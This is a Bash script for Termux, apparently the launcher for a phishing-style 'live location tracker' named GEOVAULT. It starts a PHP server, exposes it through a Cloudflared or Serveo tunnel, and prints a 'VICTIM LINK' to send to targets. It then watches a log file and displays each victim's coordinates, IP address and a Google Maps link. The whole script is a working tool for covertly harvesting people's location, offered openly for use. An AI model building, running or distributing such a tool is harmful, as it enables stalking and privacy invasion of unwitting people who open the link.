#!/usr/bin/env bash

# Colors
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
blue='\e[94m'
magenta='\e[95m'
reset='\e[0m'

# Auto-install required packages
echo -e "${yellow}[+] Installing required packages...${reset}"
pkgs=(php openssh wget figlet inotify-tools lolcat)
for pkg in "${pkgs[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${cyan}Installing $pkg...${reset}"
        pkg install $pkg -y >/dev/null 2>&1
    fi
done

# Install cloudflared if not installed
if ! command -v cloudflared >/dev/null 2>&1; then
    echo -e "${cyan}Installing cloudflared...${reset}"
    pkg install cloudflared -y >/dev/null 2>&1
fi

# Banner
clear
# NEW ASCII banner requested by user added below
echo -e "${magenta}░█▀▀░█▀▀░█▀█░█░█░█▀█░█░█░█░░░▀█▀░░${reset}"
echo -e "${magenta}░█░█░█▀▀░█░█░▀▄▀░█▀█░█░█░█░░░░█░░░${reset}"
echo -e "${magenta}░▀▀▀░▀▀▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀▀▀░░▀░░░${reset}"

echo -e "${cyan}===================================${reset}"
echo -e "${green}  GEOVAULT • LIVE LOCATION TRACKER${reset}"
echo -e "${yellow}  Created by: thakur2309${reset}"
echo -e "${cyan}  YouTube: @FirewallBreaker ${reset}"
echo -e "${cyan}===================================${reset}"
echo ""

# Tunnel Menu
echo -e "${yellow}[+] Choose Tunnel Option:${reset}"
echo -e "${green}1) Localhost (default)${reset}"
echo -e "${cyan}2) Cloudflared (Public Link)${reset}"
echo -e "${red}3) Serveo.net (SSH Tunnel)${reset}"
echo -ne "${yellow}Enter choice [1-3]: ${reset}"
read opt
opt=${opt:-1}

# Start PHP Server
echo -e "${yellow}\n[+] Starting PHP server on 127.0.0.1:8080${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 3

# Tunnel Setup
link=""
if [[ $opt == 2 ]]; then
    echo -e "${yellow}[+] Starting Cloudflared tunnel...${reset}"
    killall cloudflared >/dev/null 2>&1
    rm -f .clflog
    cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
    sleep 8
    echo -e "${yellow}[+] Fetching public link...${reset}"
    for i in {1..20}; do
        link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog | head -n1)
        [[ $link ]] && break
        sleep 1
    done
    [[ -z $link ]] && echo -e "${red}[-] Cloudflared failed!${reset}" && exit 1

elif [[ $opt == 3 ]]; then
    echo -e "${yellow}[+] Starting Serveo.net SSH tunnel...${reset}"
    killall ssh >/dev/null 2>&1
    rm -f .servolog
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
    sleep 10
    echo -e "${yellow}[+] Fetching Serveo link...${reset}"
    for i in {1..20}; do
        link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .servolog | head -n1)
        [[ $link ]] && break
        sleep 1
    done
    [[ -z $link ]] && echo -e "${red}[-] Serveo failed!${reset}" && exit 1
else
    link="http://localhost:8080"
fi

# Show Final Link
echo -e "\n${cyan}[+] VICTIM LINK (Send this):${reset}"
echo -e "${green}    $link${reset}"
echo -e "${cyan}===================================${reset}"

# Monitor ONLY NEW lines (real-time only)
echo -e "${yellow}[+] Waiting for NEW victim location...${reset}\n"


# Create file if not exists
touch locations.txt
chmod 777 locations.txt

# Track file size to detect new data
last_size=$(stat -c%s locations.txt 2>/dev/null || echo 0)

while true; do
    current_size=$(stat -c%s locations.txt 2>/dev/null || echo 0)

    if [[ $current_size -gt $last_size ]]; then
        # Read only NEW lines
        new_data=$(tail -c +$((last_size + 1)) locations.txt)

        if [[ $new_data == *"Lat"* ]]; then
            # Extract using awk to avoid 'cut' delimiter error
            lat=$(echo "$new_data" | awk -F 'Lat: ' '{print $2}' | awk '{print $1}')
            lon=$(echo "$new_data" | awk -F 'Lon: ' '{print $2}' | awk '{print $1}')
            acc=$(echo "$new_data" | awk -F 'Acc: ±' '{print $2}' | awk '{print $1}' | tr -d ' ')
            ip=$(echo "$new_data" | awk -F 'IP: ' '{print $2}' | awk '{print $1}')
            time=$(echo "$new_data" | sed 's/.*\[\([^]]*\)\].*/\1/')

            # Google Maps Link
            maps_link="https://www.google.com/maps?q=$lat$lon"

            echo -e "${red}╔══════════════════════════════════════════════════╗${reset}"
            echo -e "${red}║${yellow} NEW VICTIM LOCATION!${red}                         ${reset}"
            echo -e "${red}╠══════════════════════════════════════════════════╣${reset}"
            echo -e "${red}║${green} Time :$cyan $time${reset}                     ${red}${reset}"
            echo -e "${red}║${green} IP   :$cyan $ip${reset}                       ${red}${reset}"
            echo -e "${red}║${green} Lat  :$cyan $lat${reset}                      ${red}${reset}"
            echo -e "${red}║${green} Lon  :$cyan $lon${reset}                      ${red}${reset}"
            echo -e "${red}║${green} Acc  :$cyan ±$acc m${reset}                   ${red}${reset}"
            echo -e "${red}╠══════════════════════════════════════════════════╣${reset}"
            echo -e "${red}║${blue} MAPS :$cyan $maps_link${reset}   ${red}${reset}"
            echo -e "${red}╚══════════════════════════════════════════════════╝${reset}"
            echo ""

            # Copy + Toast
            echo "$maps_link" | termux-clipboard-set 2>/dev/null || true
            termux-toast "New Location + Map Copied!" 2>/dev/null || true
        fi

        last_size=$current_size
    fi

    sleep 1
done
